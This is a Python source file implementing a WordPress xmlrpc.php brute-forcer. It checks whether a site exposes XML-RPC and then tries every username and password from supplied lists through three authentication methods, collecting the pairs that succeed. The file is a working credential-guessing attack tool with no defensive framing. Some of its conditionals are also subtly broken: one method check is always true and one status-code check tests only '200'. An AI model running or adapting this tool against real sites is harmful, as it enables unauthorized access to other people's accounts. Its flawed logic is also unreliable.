import socket
import xmlrpc.client

import requests

from httpsrequesthandler import HTTPRequestHandler


class XmlRpcPhpBruteforcer(object):

    def __init__(self, domain, proxies=None):
        """
        Keep state of data that is collected and tries that were performed for efficieny
        :param domain: String. domain.
        :param proxies: working via HTTP proxies
        """
        self._https = None
        self._dictOfPasswords = dict()
        self._domain = domain
        self._proxies = proxies

    def bruteforce(self, usernames, passwords, retries=0, timeout=5):
        """
        this functhon run the run_bruteforce over xmlrpc.php url.
        :param usernames:list. list of usernames we want t 0 brutforce.
        :param passwords:list. list of passwords to perform the bruteforce.
        :param retries: The number of tries that each HTTP request will be sent until it will succeed
        :param timeout: How much time each HTTP request will wait for an answer
        :return: dict. dict of passwords and usernames who succesfully bruteforce via xmlrpc.php.
        """
        try:
            prefix = "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
            '''figure out if this site is http or https'''
            r = HTTPRequestHandler().send_http_request(method='get', url='http://' + str(self._domain))
            complete_url = r.url + '/xmlrpc.php'
            resp = requests.post(complete_url, prefix, verify=False, allow_redirects=False,
                                 timeout=timeout)
            if 'metaWeblog.getUsersBlogs' or 'wp.getCategories' or 'wp.getUsersBlogs' in resp.text:
                list_of_methods = ['metaWeblog.getUsersBlogs', 'wp.getCategories', 'wp.getUsersBlogs']
                for method in list_of_methods:
                    for u in usernames:
                        for p in passwords:
                            xml_request = f"<methodCall><methodName>{method}</methodName><params>\
                                        <param><value>{u}</value></param><param><value>{p}</value></param>\
                                        </params></methodCall>"
                            resp = requests.post(complete_url, xml_request, verify=False, allow_redirects=False,
                                                 timeout=timeout)
                            if str(resp.status_code) != '200':
                                continue
                            elif 'Incorrect username or password' in resp.text:
                                continue
                            elif 'Insufficient arguments passed to this XML-RPC method' in resp.text:
                                continue
                            elif 'faultString' in resp.text:
                                continue
                            else:
                                self._dictOfPasswords[u + p] = (u, p)
            return self._dictOfPasswords
        except Exception as e:
            print(e)
            print("error in executing function: 'bruteforce' in xmlrpc.php brutforcer")

    def is_method_possible(self):
        """
        check whether the bruteforce via xmlrpc.php is possible for the domain or not
        :return:boolean. Returns whether the bruteforce via xmlrpc.php is possible for the domain or not
        """
        try:
            '''figure out if this site is http or https'''
            r = HTTPRequestHandler().send_http_request(method='get', url='http://' + str(self._domain))
            url = r.url + '/xmlrpc.php'
            http_handler = HTTPRequestHandler()
            response = http_handler.send_http_request(method='post', url=url)
            if str(response.status_code) == ('200' or '403' or '401'):
                return True
            return False
        except Exception as e:
            print(e)
